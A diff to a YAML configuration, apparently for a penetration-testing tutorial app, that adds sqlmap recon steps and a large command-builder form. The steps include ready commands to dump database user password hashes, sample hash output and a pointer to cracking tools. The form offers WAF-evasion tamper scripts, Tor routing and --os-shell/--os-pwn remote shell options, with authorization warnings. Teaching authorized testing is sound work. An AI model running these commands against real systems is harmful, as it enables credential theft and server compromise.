@@ -234,6 +234,74 @@ flows:
             cause: "The injected user has restricted rights."
             fix: "Note the limit; continue with what is readable."
             check: "Try --current-db / --current-user."
+  - flow_id: quick_recon
+    title: "Quick recon flags — context before you dig (reference)"
+    goal: "Answer 'who am I, what can I see' in a few cheap flags before spending time on a full table dump."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: qr1
+        title: "Identify the database and yourself"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [dbms]
+        explanation:
+          what: "`--banner` prints the DBMS's own version string; `--current-user` and `--current-db` show who the injected connection is running as and which database it's currently 'in'; `--hostname` shows the server's hostname; `--is-dba` tells you if that user has admin rights."
+          why: "These are cheap, fast, low-noise checks that tell you what you're actually dealing with — a low-privilege web user, or a full database admin — before you decide how deep to dig."
+          where: "ACTION_OPTIONS; combine as many of these as you like in one run."
+        find_it: "No new input — reuse the injectable URL you already confirmed. These flags don't need a database/table name."
+        command_anatomy:
+          - {token: "sqlmap -u \"...\" --batch", does: "target + no prompts"}
+          - {token: "--banner", does: "print the DBMS version string"}
+          - {token: "--current-user", does: "show the current DB user"}
+          - {token: "--current-db", does: "show the current database"}
+          - {token: "--is-dba", does: "check if the current user is an administrator"}
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --banner --current-user --current-db --is-dba"
+        success_criteria: "A short block of facts prints: DBMS version, current user, current database, and a yes/no on admin rights."
+        expected_output: |
+          [*] banner: '5.7.32-0ubuntu0.18.04.1 (Ubuntu)'
+          [*] current user: 'shop_app@localhost'
+          [*] current database: 'shop'
+          [*] current user is DBA: False
+        alternatives:
+          - trigger: "current user is DBA: True"
+            cause: "The web app's database account has full admin rights — often a misconfiguration."
+            fix: "Worth noting as a finding on its own — a DBA-privileged web account is a bigger deal than the injection itself. Proceed carefully and only within your authorized scope."
+            check: "This is a genuine, high-value finding, not an error."
+          - trigger: "some fields blank"
+            cause: "A blank current-user/current-db just means the DBMS doesn't expose that concept the same way (varies by engine), not a failure."
+            fix: "Treat it as N/A for this DBMS and move on to --dbs/--tables instead."
+            check: "Not a failure — proceed to database/table enumeration."
+      - step_id: qr2
+        title: "See who else has access"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "`--users` lists every DB user account; `--passwords` dumps their password HASHES (not plaintext); `--privileges` and `--roles` show what each user is allowed to do."
+          why: "Shows the full blast radius — not just the app's own account, but every account on the server, and how privileged each one is."
+          where: "ACTION_OPTIONS."
+        find_it: "No new input — same target. This usually needs DBA rights (check --is-dba first) to see other users' details."
+        command_anatomy:
+          - {token: "sqlmap -u \"...\" --batch", does: "target + no prompts"}
+          - {token: "--users", does: "list all database user accounts"}
+          - {token: "--passwords", does: "dump password HASHES for those users"}
+          - {token: "--privileges", does: "show what each user is allowed to do"}
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --users --passwords --privileges"
+        success_criteria: "A list of usernames prints, each with a password hash and privilege list."
+        expected_output: |
+          database management system users [2]:
+          [*] 'root'@'localhost'
+          [*] 'shop_app'@'localhost'
+          database management system users password hashes:
+          [*] root [1]:
+              password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+        alternatives:
+          - trigger: "insufficient privileges"
+            cause: "The injected user isn't a DBA — reading other users' accounts needs admin rights."
+            fix: "Confirm with --is-dba first; without DBA rights, this information usually isn't reachable."
+            check: "Not a bug — expected when the account isn't privileged."
+          - trigger: "hashes, not plaintext passwords"
+            cause: "That's how databases store passwords — sqlmap extracts what's stored, it doesn't reverse it."
+            fix: "Cracking those hashes (only if authorized) is a job for the john or hashcat tools in this app."
+            check: "Recognise the values as hashes to hand off, not a failure."
   - flow_id: enum_tables
     title: "Enumerate tables & columns (reference)"
     goal: "List tables in a database, then columns in a table."
@@ -439,25 +507,163 @@ quick_build:
     - field_id: url
       label: "Target URL"
       type: string
-      required: true
       placeholder: "http://host/page.php?id=1"
+      help: "Needs a parameter (?id=1). Leave blank if using Request file or URL list below instead."
+    - field_id: request_file
+      label: "Request file (-r)"
+      type: path
+      placeholder: "request.txt  (optional — overrides Target URL; for logged-in/POST targets)"
+    - field_id: urls_file
+      label: "URL list file (-m)"
+      type: path
+      placeholder: "urls.txt  (optional — test many URLs in one run)"
     - field_id: profile
       label: "Profile"
       type: choice
       default: detect
       choices: [detect, map, dump, thorough]
-    - field_id: dbs
-      label: "Enumerate databases (--dbs)"
-      type: bool
-    - field_id: level
-      label: "Level (1-5)"
-      type: int
-      placeholder: "1"
-    - field_id: risk
-      label: "Risk (1-3)"
-      type: int
-      placeholder: "1"
+      help: "detect=just find the injection, map=list databases, dump=extract data, thorough=deeper/slower detection."
     - field_id: batch
       label: "Non-interactive (--batch)"
       type: bool
       default: true
+      help: "Accept sqlmap's own sensible defaults instead of prompting you with questions."
+    - field_id: param
+      label: "Focus one parameter (-p)"
+      type: string
+      placeholder: "id  (optional — test only this parameter)"
+    - field_id: level
+      label: "Level (1-5)"
+      type: int
+      placeholder: "1"
+      help: "How many places to test (cookies/headers included at higher levels)."
+    - field_id: risk
+      label: "Risk (1-3)"
+      type: int
+      placeholder: "1"
+      help: "How aggressive the test payloads are."
+    - field_id: technique
+      label: "Technique(s) (--technique)"
+      type: string
+      placeholder: "BEU  (optional — B=Boolean E=Error U=Union, etc.)"
+    - field_id: dbms
+      label: "Force DBMS (--dbms)"
+      type: string
+      placeholder: "MySQL  (optional — skips fingerprinting if you already know it)"
+    - field_id: data
+      label: "POST body (--data)"
+      type: string
+      placeholder: "username=x&password=y  (optional, for POST forms)"
+    - field_id: cookie
+      label: "Cookie (--cookie)"
+      type: string
+      placeholder: "PHPSESSID=abc123  (optional, for logged-in testing)"
+    - field_id: random_agent
+      label: "Random User-Agent (--random-agent)"
+      type: bool
+    - field_id: threads
+      label: "Threads (--threads)"
+      type: int
+      placeholder: "e.g. 4  (optional, speeds up multi-request operations)"
+    - field_id: verbosity
+      label: "Verbosity 0-6 (-v)"
+      type: int
+      placeholder: "optional"
+    - field_id: tamper
+      label: "Tamper script (--tamper)"
+      type: string
+      placeholder: "space2comment  (optional, for evading a WAF)"
+    - field_id: proxy
+      label: "Proxy (--proxy)"
+      type: string
+      placeholder: "http://127.0.0.1:8080  (optional, e.g. route through Burp)"
+    - field_id: tor
+      label: "Route through Tor (--tor --check-tor)"
+      type: bool
+    - field_id: dbs
+      label: "List databases (--dbs)"
+      type: bool
+    - field_id: db
+      label: "Database name (-D)"
+      type: string
+      placeholder: "shop  (from --dbs results)"
+    - field_id: tables
+      label: "List tables in the database (--tables)"
+      type: bool
+    - field_id: table
+      label: "Table name (-T)"
+      type: string
+      placeholder: "users  (from --tables results)"
+    - field_id: columns
+      label: "List columns in the table (--columns)"
+      type: bool
+    - field_id: cols
+      label: "Column names (-C)"
+      type: string
+      placeholder: "username,password  (from --columns results)"
+    - field_id: dump
+      label: "Dump the selected table/columns (--dump)"
+      type: bool
+    - field_id: banner
+      label: "DBMS banner/version (--banner)"
+      type: bool
+    - field_id: current_user
+      label: "Current DB user (--current-user)"
+      type: bool
+    - field_id: current_db
+      label: "Current database (--current-db)"
+      type: bool
+    - field_id: hostname
+      label: "DB server hostname (--hostname)"
+      type: bool
+    - field_id: is_dba
+      label: "Is the user an admin? (--is-dba)"
+      type: bool
+    - field_id: users
+      label: "List DB users (--users)"
+      type: bool
+    - field_id: passwords
+      label: "Dump user password hashes (--passwords)"
+      type: bool
+    - field_id: privileges
+      label: "List user privileges (--privileges)"
+      type: bool
+    - field_id: roles
+      label: "List user roles (--roles)"
+      type: bool
+    - field_id: schema
+      label: "Enumerate DB schema (--schema)"
+      type: bool
+    - field_id: count
+      label: "Row count only (--count)"
+      type: bool
+    - field_id: search
+      label: "Search for a column/table/db name (--search)"
+      type: string
+      placeholder: "password  (optional — finds tables/columns matching this name)"
+    - field_id: exclude_sysdbs
+      label: "Exclude system databases (--exclude-sysdbs)"
+      type: bool
+    - field_id: dump_all
+      label: "Dump EVERY database (--dump-all)"
+      type: bool
+      help: "Very slow, very noisy, and usually over-collects. Prefer targeted -D/-T/-C dumping."
+    - field_id: all
+      label: "Retrieve everything (-a / --all)"
+      type: bool
+      help: "banner+users+passwords+dbs+tables+dump in one run. Slow, very noisy, high legal exposure — use only with clear written authorization for this exact scope."
+    - field_id: sql_shell
+      label: "Interactive SQL shell (--sql-shell)"
+      type: bool
+    - field_id: os_shell
+      label: "Interactive OS shell (--os-shell)"
+      type: bool
+      help: "Executes commands on the target server. Authorized engagements only."
+    - field_id: os_pwn
+      label: "Full OOB shell via Metasploit (--os-pwn)"
+      type: bool
+      help: "Meterpreter/VNC shell — real exploitation, not just data extraction. Authorized engagements only, needs Metasploit installed."
+    - field_id: output_dir
+      label: "Output directory (--output-dir)"
+      type: path
+      placeholder: "optional — defaults to sqlmap's own output folder"
